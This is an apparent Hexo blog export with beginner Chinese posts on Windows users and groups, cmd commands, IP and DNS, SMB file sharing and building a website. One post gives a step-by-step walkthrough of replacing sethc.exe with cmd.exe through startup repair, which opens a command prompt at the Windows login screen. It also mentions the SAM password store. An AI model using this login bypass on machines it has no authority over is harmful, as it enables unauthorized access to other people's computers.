      <url>/2020/05/11/%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%851/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="组与管理（本人目前就学了这么多如果有不对的地方欢迎指正）"><a href="#组与管理（本人目前就学了这么多如果有不对的地方欢迎指正）" class="headerlink" title="组与管理（本人目前就学了这么多如果有不对的地方欢迎指正）"></a>组与管理（本人目前就学了这么多如果有不对的地方欢迎指正）</h1><p>我们每一个人的电脑上都会有用户，而每一个用户的权限不一样，将相同权限的用户归于同一个族中就会形成不同的组，例如在win10系统中我们一般登录的话都是用自己的用户名和密码登录，win7中会发现我们登陆时用户名为Administrator，在这里win10与win7不同的是win10将Administrator同用户分离出来相当于是一样的“分身”，而我们所用的是分离出来的这一个。说了这么多，那么我们的电脑上到底有多少用户，<del>在这里我先对组进行解释再对用户进行解释</del>，我们电脑上的组大致分为（win10）：</p><p><strong>vmware</strong><br>Administrators<br>Device Owners<br>Distributed COM Users<br>Event Log Readers<br>Guests<br>Hyper-V Administrators<br>IIS_IUSRS<br>Performance Log Users<br>Performance Monitor Users<br>Remote Management Users<br>System Managed Accounts Group<br>Users</p><p>我的组可能和一般的不一样（<del>我装了某些软件的原因</del>），这其中权限最高的是Administrators（管理员组）这个组，而我们平常登录电脑时所用的用户名就在这个组中，但是这并不代表我们就有最高权限，在这个组中administrator有着最高权限，相当于可以对电脑上的设置进行修改，这里的Guests组是一个来访外宾组，这个组中的成员可以对你电脑上的文件进行访问，但无法进行修改，上传等功能，也就说这个组里的用户权限很小。接着我们来说一下Users这个组，这个组的成员的权限比Guests大，但比Administrators小，如果我们新建一个用户的话默认实在这个组里，如果想要对新建的用户进行权限的升级请往下看。</p><h2 id="用户标识符（SID）"><a href="#用户标识符（SID）" class="headerlink" title="用户标识符（SID）"></a>用户标识符（SID）</h2><p>我们每个用户在电脑上都会自己的SID，而SID相当于我们的身份证，一般来说，Windows普通用户的SID从1000开始（包括我们自己登陆时用的用户），而管理员也就是Administrator这个用户的SID是从500开始的。</p><h2 id="用户整体知识的补充"><a href="#用户整体知识的补充" class="headerlink" title="用户整体知识的补充"></a>用户整体知识的补充</h2><p>一个电脑的用户总体上分为三类（这里所说的是整体同上边的不一样）：system 系统账户（权限至高无上），localservices本地服务账户（普通权限），networkservices网络服务账户（普通权限），而我们上边所说的Administrators组隶属于localservices这里，而我们如果有些系统设置需要对注册表的值进行修改有时候就需要用到system这个账户（有些注册表Administrator用户权限不够），同时我们如果将win10系统默认的文件共享关闭的话也需要用到这个账户。在这里我进行一个知识补充，我们一般的用户开机密码，一些软件的登录密码等都存储在C:\windows\system32\config\SAM这个文件里（别想着去打开这个文件，凭你的权限还打不开），如果我们想要打开这个文件，就需要用到这个账户。在windows系统上，默认密码最长有效期42天（尤其是服务器系统）。</p><h2 id="介绍个部分win7和win10的漏洞"><a href="#介绍个部分win7和win10的漏洞" class="headerlink" title="介绍个部分win7和win10的漏洞"></a>介绍个部分win7和win10的漏洞</h2><p>我们在开机时输入登陆密码的界面按五次shift键，会弹出c:\windows\system32\sethc.exe程序，这时候直接重启，在重启到正在载入Windows界面是直接关机再重启，这时候会出现多个选择，选择启动启动修复选项，这之后会出现系统还原的提示，点击取消，在等待几分钟之后会出现问题原因框，点击查看详细信息，下拉点击扩展名为.txt的链接会出现一个记事本，这时候点击文件，点击打开，然后找到C:\windows\system32这个文件，然后找到cmd.exe这个程序，复制一份，将文件名改为sethc，再将原来sethc.exe这个程序的名称改为其他的，之后再次重启，再按五次shift键出来的就是cmd命令行了，之后的操作就不多说了-.-。</p><h2 id="简单的命令行命令"><a href="#简单的命令行命令" class="headerlink" title="简单的命令行命令"></a>简单的命令行命令</h2><blockquote><p>netstat -an<br>查看本机所有开放端口<br>telnet：23<br>远程桌面协议RDP：3389<br>文件共享服务：445<br>HTTP协议端口号：TCP：80<br>HTTPS协议端口号：TCP：443<br>FTP端口号： TCP： 20/21  </p><p>whoami    查看当前用户名<br>whoami  /user 查看当前用户名以及SID<br>net share   查看共享文件夹的目录<br>net share  共享文件夹名 /del   删除共享</p><p>ipconfig    查看自己本机的IP<br>ipconfig /all   查看自己本机的所有IP<br>ipconfig /release  释放IP<br>ipconfig /flushdns  删除本地dns缓存</p><p>net user laji 显示用户laji的信息<br>net user laji /add 增加用户laji<br>net user laji /del 删除用户laji<br>net user laji /active:yes 激活用户laji<br>net user laji /active:no 禁用用户laji</p><p>net localgroup 显示全部本地组<br>net localgroup administrators 显示组administrators的成员<br>net localgroup ceo /add 增加组ceo<br>net localgroup ceo laji /add 向组ceo中加入成员laji<br>net localgroup ceo laji /del 向组ceo中删除成员laji</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP和DNS的简单叙述</title>
      <link href="/2020/04/20/IP%E5%92%8CDNS%E7%9A%84%E7%AE%80%E5%8D%95%E5%8F%99%E8%BF%B0/"/>
      <url>/2020/04/20/IP%E5%92%8CDNS%E7%9A%84%E7%AE%80%E5%8D%95%E5%8F%99%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="IP的简单叙述前的部分知识补充"><a href="#IP的简单叙述前的部分知识补充" class="headerlink" title="IP的简单叙述前的部分知识补充"></a>IP的简单叙述前的部分知识补充</h1><p>众所周知，我们每一个普通的个人电脑都会有一个IP，那么IP是什么呢？</p><p>本人认为IP是一种标识性的编码，其实现在通用的普通IP是32二进制编码，但为了方便记忆一般都是将IP进行了十进制的翻译，且在翻译为十进制时，每个字节最多为3位，（有一些基本常识都知道在电脑中二进制是8位为一个字节，所以翻译为十进制最大为三位数），所以十进制下的IP地址每个字节最多为3位。</p><p>这里作为对IP地址的进一步的补充，我首先说一下网段这个概念，比如说：一个不懂中文的外国人和一个不懂英文的中国人在口语方面不能进行交流，同样的来自不同网段的的PC由于规则限制也不能够交流（这里可以将语言的不同比作为规则的限制，不同的人比作为不同网段的PC），说这麽多我们可以通过举例来说明一个网段的具体实现。</p><p>例如：10.1.1.1-10.1.1.255这一段IP可以说是一个网段，就好比在同一国家的人能够实现互相的语言交流（不同PC的交流），当然发现这个网段的IP数目有点少，我们也可以将10.1.1.1-10.1.255.255当作一个网段，这样一来IP数目就多了，能够交流的人也就多了，同样的我们可以将10.1.1.1-10.255.255.255当作一个网段，而通常我们会用10.1.1.0来表示10.1.1.1-10.1.1.255这个网段。</p><p>说这么多，那怎么在获取一个IP地址时知道它是哪个网段呢？这里我介绍一个概念：子网掩码，我们在命令行输入ipconfig可以看到我们自己PC端的IP地址，通常我们在IPv4下一行会看到子网掩码，那么子网掩码到底是干啥的？这里我举例说明一下：<br>例如我的IP为10.1.1.1，此时子网掩码为255。255.255.0，那么我的IP就属于10.1.1.0这个网段其中的一个IP，如果我的子网掩码为255.255.0.0，那么我的IP就属于10.1.0.0这个网段，其实子网掩码就是对网段位数的限制。</p><p>这里我在说明一点如果你的网段为10.1.1.0，但并不代表你属于10.1.0.0这个网段，每个网段都是相互独立的，就好比不同的人来自不用的国家（网段），虽然他们都是人（IP），有的人来自国土较小的国家，有的人来自国土较大的国家，但并不代表小国就属于大国。同样的如果我的IP为10.1.1.1，子网掩码为：255.255.255.0另一台PC的IP为：20.1.1.1，子网掩码为：255.255.255.0，我们这两台IP是不能通信的，因为我们来自不同的“国家”（网段）。</p><h1 id="DNS服务器"><a href="#DNS服务器" class="headerlink" title="DNS服务器"></a>DNS服务器</h1><p>所谓DNS也称域名解析服务器，这个服务器在我们的日常上网时起到了很重要的作用。</p><p>通常我们在访问一个网站时基本都是输入网站的域名，例如我访问百度时：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 这就是百度的域名（确切来说是主机名加域名，这里不做过多解释），我访问百度时而不是用百度的IP地址直接访问，这个是由于记住网站的IP实在有点难度，所以，我们就设置了域名（这是我自己的想法，具体为啥不用网站IP还有其他的原因）。</p><h2 id="接下来步入主题"><a href="#接下来步入主题" class="headerlink" title="接下来步入主题"></a>接下来步入主题</h2><h3 id="1-访问一个网站的过程的简单解释（不专业也不完全版）"><a href="#1-访问一个网站的过程的简单解释（不专业也不完全版）" class="headerlink" title="1.访问一个网站的过程的简单解释（不专业也不完全版）"></a>1.访问一个网站的过程的简单解释（不专业也不完全版）</h3><p>首先，你输入网站的域名之后，你的PC会先从你的本地缓存中找是否有你这个域名的缓存，如果没有再从你本地的一个文件中找是否有缓存（一般这个文件都是空的，这里就不多说了），然后通过你的网关也就是你的路由器，发送相关请求到DNS服务器，然后服务器会根据你的请求来进行服务器上的缓存筛选，如果服务器的缓存中有你这个域名的缓存，它会将这个域名所代表服务器的IP地址再通过你的网关发送到你的PC端上，然后你的PC根据这个IP访问相对应的服务器，这是你的PC会有一段时间有对这个域名的缓存，当你在第二次访问这个域名时你的PC会直接根据缓存中的IP地址来访问相关的服务器。</p><h3 id="2-网关的相关解释（不专业也不完全版）"><a href="#2-网关的相关解释（不专业也不完全版）" class="headerlink" title="2.网关的相关解释（不专业也不完全版）"></a>2.网关的相关解释（不专业也不完全版）</h3><p>一般来说我们组建局域网（内网）需要同过交换机，而交换机的作用其实相当于一个中介，例如：有两台PC，原本不能相互通讯，当这两台PC连上同一个交换机时就能够相互通讯，如果电脑A想发送信息到电脑B，那么这其中的过程为A所发送的信息到交换机，再由交换机转到B。</p><p>上述的情况只能够在一个局域网内进行，如果想连到外网，这里就需要路由器，而路由器就相当于内网与外网相连接窗口，我们普通家用的路由器基本上可以说是是交换机和路由器的“合体”。</p>]]></content>
      
      
      <categories>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件共享</title>
      <link href="/2020/04/16/%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB/"/>
      <url>/2020/04/16/%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="文件共享"><a href="#文件共享" class="headerlink" title="文件共享"></a>文件共享</h1><p>本人学了一点文件共享的知识在这里分享一下</p><h2 id="具体操作过程"><a href="#具体操作过程" class="headerlink" title="具体操作过程"></a>具体操作过程</h2><p>创建用户a密码为a<br>命令行：net user a a /add<br>1.创建文件夹，并在文件的属性中找到共享栏，点击高级共享在这里设置你共享的文件夹名字在高级共享中有权限设置，在这里进行相关权限的设置。<br>2.在所共享的文件夹中的安全栏中的高级处点击禁用继承，这时会弹出一个对话框提示你是否对原本的权限进行保留（根据自身需要进行选择），之后回到安全界面选择添加然后选择主体，在输入要选择的对象名称处添加你所想要授权访问的同户名，然后再给你所设置的用户设置权限。（这里你所设置的用户名必须先前在你自己的电脑上已经有的用户名）如果你想在说共享的文件夹中的子文件夹进行权限设置，步骤同上边2相同。<br>3.访问你所共享的文件夹（这里我举的例子是在同一座交换机上，也可以在虚拟机上操作）win+r打开运行窗口输入： //你要访问的共享文件夹所在的主机IP地址，然后的操作有手就行，这里不做过多阐述，另一种方法是访问文件夹也可以在运行窗口输入： //你要访问的共享文件夹所在的主机IP地址/共享文件夹名字 ，之后就可以共享了。</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>如果你想在文件共享中将一些文件隐藏起来，可以在设置文件的共享名时，在文件的共享名后边加一个$符，这样别人在访问这个文件夹时就必须在地址栏上输入： //你的IP地址/共享文件夹名/隐藏的文件夹名$<br>例如我的IP地址为10.1.1.1，我所共享的文件夹名为share我所隐藏的文件夹名为dollar，则我需要在地址栏上输入：//10.1.1.1/share/dollar$</p>]]></content>
      
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站建造</title>
      <link href="/2020/04/07/%E7%BD%91%E7%AB%99%E5%BB%BA%E9%80%A0/"/>
      <url>/2020/04/07/%E7%BD%91%E7%AB%99%E5%BB%BA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="自建网站过程"><a href="#自建网站过程" class="headerlink" title="自建网站过程"></a>自建网站过程</h1><p>本人白嫖阿里云的服务器没嫖到，就自己买了个服务器，结果一大堆麻烦事，整个域名验证还老不通过，索性就直接用id了。</p><h2 id="一：利用阿里云服务器建网站"><a href="#一：利用阿里云服务器建网站" class="headerlink" title="一：利用阿里云服务器建网站"></a>一：利用阿里云服务器建网站</h2><p>首先你的先有个服务器，本人用的是ubantu的版本，注意这里你在配置服务器的时候需要选择相关网站的镜像，（本人用的是wordpress的镜像）否则的话，就要重新安装服务器系统了。在配置完服务器之后，你可以直接在网页地址栏中输入你的服务器的IP地址就可以直接访问你所设置的网页初始页面。</p><p>我的网站因为设置的是wordpress的类型的博客所以在初始页面中会让我设置登录名，密码，邮箱等。等弄好之后就可以访问你的博客网站了。</p><p>如果还是不太明白可以看这位的建网站过程：<a href="https://developer.aliyun.com/course/70?spm=a2c6h.13788107.J_7606789820.2.3c1961a8aoO1qQ" target="_blank" rel="noopener">https://developer.aliyun.com/course/70?spm=a2c6h.13788107.J_7606789820.2.3c1961a8aoO1qQ</a></p><h2 id="二：利用GitHub和hexo建造个人博客（也是我现在所用的界面）"><a href="#二：利用GitHub和hexo建造个人博客（也是我现在所用的界面）" class="headerlink" title="二：利用GitHub和hexo建造个人博客（也是我现在所用的界面）"></a>二：利用GitHub和hexo建造个人博客（也是我现在所用的界面）</h2><p>这个方法过程有点复杂，本人也不太明白这其中的原理，具体建造过程可以根据这位的教程：<a href="https://yafine-blog.cn/posts/4ab2.html" target="_blank" rel="noopener">https://yafine-blog.cn/posts/4ab2.html</a></p><p>在这里本人也提醒一下，在建造网站的过程中，一定要看好是在哪个文件夹的根目录文件进行相关修改（本人应为这个原因重做了好几次），同时也要及时进行文件的同步，要不然你的网站就没啥变化，最后，提醒一下如果你的网页出现找不到相关页面的话，可以在GitHub上看下你是否有这个文件，如果没有的话就要重新同步一下，如果同步完之后还是没有的话就在你的网站所在文件夹的public文件夹中看下是否有相关文件夹，没有的话就粗暴点自己手动建个然后再同步，基本上就解决了（<del>本人在建网站时因为这个问题都快疯了</del>）。 </p>]]></content>
      
      
      
        <tags>
            
            <tag> 网站的建造 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
